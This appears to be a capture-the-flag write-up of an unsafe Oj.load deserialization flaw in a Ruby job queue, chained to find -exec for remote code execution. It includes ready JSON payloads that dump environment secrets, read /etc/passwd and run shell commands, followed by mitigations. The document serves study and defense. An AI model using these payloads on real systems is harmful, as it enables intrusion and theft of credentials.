# Vulnerability Report DOJO 48

---

## Unsafe Object Deserialization via `Oj.load` Leading to Remote Code Execution

The application deserializes user-controlled JSON payloads using `Oj.load`, a Ruby gem that supports arbitrary object instantiation via the `^o` key. Combined with the `Node` class — which executes shell commands via `find -exec` — this leads to complete remote code execution on the server, including full environment variable disclosure.

---

## Root Cause — Step-by-Step Breakdown

The vulnerability chain occurs across two components of the job queue system.

### Step 1 — User input reaches `Oj.load` unsanitized

```ruby
payload = URI.decode_www_form_component(user_input)
job = Job.create!(status: "queued", payload: payload)

# Later in JobRunner.run
data = Oj.load(job.payload)  # Unsafe deserialization
RubitMQ.new(data).run()      # Triggers run_find if available
```

`Oj.load` supports a special `^o` key that instructs the parser to instantiate a named Ruby class with attacker-controlled attributes. This allows arbitrary object creation from untrusted input.

### Step 2 — Automatic method dispatch to `Node#run_find`

```ruby
if @data.respond_to?(:run_find)
    @data.run_find  # Calls Node's run_find method
end
```

```ruby
def run_find()
    puts Open3.capture3("find", *@args)
end
```

When `Oj.load` instantiates a `Node` object, `JobRunner` automatically calls `run_find` if the method exists. The `@args` attribute is fully attacker-controlled.

### Step 3 — Command execution via `find -exec`

By crafting the `args` array to include `-exec`, an attacker passes arbitrary commands to the shell through `find`'s exec mechanism:

```json
{"^o":"Node","args":["/tmp","-maxdepth","0","-exec","printenv",";"]}
```

This triggers:

```bash
find /tmp -maxdepth 0 -exec printenv ;
```

---

## Impact

An attacker can execute arbitrary shell commands on the server without any authentication, enabling:

- Full environment variable disclosure (secrets, flags, credentials)
- File system enumeration
- Sensitive file exfiltration
- Arbitrary command execution under the application user's permissions

---

## Proof of Concept

**Payload — dump environment variables (retrieves the flag):**

```json
{"^o":"Node","args":["/tmp","-maxdepth","0","-exec","printenv",";"]}
```

**Payload — list files in `/tmp`:**

```json
{"^o":"Node","args":["/tmp","-type","f"]}
```

**Payload — read `/etc/passwd`:**

```json
{"^o":"Node","args":["/etc","-name","passwd","-exec","cat","{}",";"]}
```

**Payload — arbitrary command execution:**

```json
{"^o":"Node","args":["/tmp","-maxdepth","0","-exec","sh","-c","whoami > /tmp/pwned",";"]}
```

**Input fields:**

| Field | Value |
|---|---|
| `action` | `search` |
| `payload` | `{"^o":"Node","args":["/tmp","-maxdepth","0","-exec","printenv",";"]}` |

**Output:**

```
<FLAG>
```

**Flag:** `<FLAG>`

---

## Mitigation

### 1. Replace `Oj.load` with safe JSON parsing

```ruby
# ❌ Vulnerable
data = Oj.load(job.payload)

# ✅ Safe
data = Oj.safe_load(job.payload)

# ✅ Or use the standard library
data = JSON.parse(job.payload)
```

### 2. Implement strict input validation with an allowlist

```ruby
class JobRunner
    ALLOWED_CLASSES = ['SafeDataClass'].freeze

    def self.run
        Job.where(status: "queued").find_each do |job|
            data = JSON.parse(job.payload)
            unless data.is_a?(Hash) && ALLOWED_CLASSES.include?(data['type'])
                job.update!(status: "failed", error: "Invalid payload")
                next
            end
            # Process safely...
        end
    end
end
```

### 3. Never pass user-controlled arguments to shell commands

```ruby
# ❌ Vulnerable
Open3.capture3("find", *user_args)

# ✅ Safe — use a hardcoded allowlist of operations
SAFE_OPERATIONS = {
    'list_tmp' => ['find', '/tmp', '-maxdepth', '1', '-type', 'f']
}.freeze

def run_find()
    command = SAFE_OPERATIONS[@operation_type]
    return unless command
    puts Open3.capture3(*command)
end
```

### 4. Principle of Least Privilege

- Run workers with a dedicated user account with minimal permissions
- Restrict file system access via containers or chroot environments
- Limit outbound network access from worker processes

---

## Vulnerability Classification

| Field | Value |
|---|---|
| **Type** | Deserialization of Untrusted Data |
| **Vector** | User-controlled JSON payload → `Oj.load` → arbitrary object instantiation |
| **Impact** | Remote Code Execution — full environment and file system access |
| **Authentication** | Not required |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **CVSS** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **9.8 Critical** |